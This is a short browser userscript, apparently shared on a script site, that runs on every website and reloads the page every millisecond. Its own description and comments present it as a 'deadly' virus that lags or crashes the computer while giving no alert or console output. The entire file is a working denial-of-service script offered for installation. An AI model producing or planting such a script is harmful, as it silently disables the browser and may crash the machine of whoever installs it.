// ==UserScript==
// @name         The weird virus?
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  So I found something weird happens when you delay a reload, after 60 or below it lags or even crashes your pc.
// @author       TheYoungDoxxer
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/541891/The%20weird%20virus.user.js
// @updateURL https://update.greasyfork.org/scripts/541891/The%20weird%20virus.meta.js
// ==/UserScript==
setInterval(() => {
    location.reload();
}, 1); //Timer, makes this whole code work.
//Normally I wouldn't add this much comments, but this is very deadly because it doesn't alert you, it doesn't use the console all it does is reload the website.